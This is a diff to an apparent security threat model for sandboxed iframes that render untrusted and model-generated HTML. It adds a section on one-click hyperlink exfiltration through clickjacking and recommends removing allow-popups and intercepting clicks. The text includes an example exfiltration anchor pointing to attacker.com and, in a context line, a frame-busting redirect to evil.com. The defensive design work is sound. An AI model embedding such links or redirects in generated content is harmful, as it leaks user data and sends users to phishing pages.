@@ -727,6 +727,14 @@ from applying this bypass to external or untrusted iframe URLs.
 - **Security Concern:** Embedded third-party scripts or model-generated HTML may attempt top-level window hijacking (frame-busting) by setting `window.top.location = "https://evil.com"`, modifying `window.parent.location`, or executing link navigations targeting `_top`. This can redirect the host user away from the application to a phishing or malicious landing page.
 - **Mandatory Sandbox Directive Rules:** All iframe `sandbox` attributes configured by host renderers or intermediate sandbox proxies must strictly omit `allow-top-navigation`, `allow-top-navigation-by-user-activation`, and `allow-top-navigation-to-custom-protocols`. Omission of these tokens ensures modern browser security engines reject any attempt by embedded browsing contexts to navigate or manipulate top-level ancestor windows.
 
+### 5.5.7. 1-Click Hyperlink Exfiltration via Navigation and Clickjacking Prevention
+
+- **Risk Assessment:** Likelihood: MED | Impact: HIGH | Relevant trust tiers: Tier 3 (Zero-trust untrusted) and Tier 2 (Semi-trusted partner).
+- **Security Concern:** While `connect-src 'none'` blocks API requests (`fetch`, `XMLHttpRequest`, `WebSocket`) and `form-action 'none'` blocks HTML form submissions, standard Content Security Policy directives do not govern normal hyperlink navigations. An embedded malicious script in `WebAppFrameSrcdoc` could read sensitive data model state or user inputs, dynamically construct an anchor tag containing the stolen data in query parameters (e.g., `<a href="https://attacker.com/leak?data=...">`), and use transparent CSS overlays to trick the user into clicking anywhere on the component. When combined with `allow-popups` in the iframe sandbox attributes, this click silently navigates to the attacker's server in a new tab or window, exfiltrating the payload.
+- **Recommended Architectural Controls & Future Work:**
+  - **Omit `allow-popups` by Default:** Remove `allow-popups` and `allow-popups-to-escape-sandbox` from the default sandbox attributes for Tier 3 untrusted iframe components, preventing programmatic or user-initiated new window spawns.
+  - **Capture-Phase Click Interception:** In the inner proxy sandbox document (`sandbox.html`), register a capturing-phase click listener (`document.addEventListener('click', ..., true)`) that cancels direct anchor navigations (`event.preventDefault()`) and requires external link opening to be routed through host-verified `a2ui_action` events.
+
 ## 5.6. Permissions Policy and Declarative Capability Delegation
 
 Because untrusted third-party code and model-generated HTML execute within sandboxed iframes, access to sensitive hardware sensors (camera, microphone, geolocation) and the system clipboard (`navigator.clipboard`) presents critical security and privacy considerations.
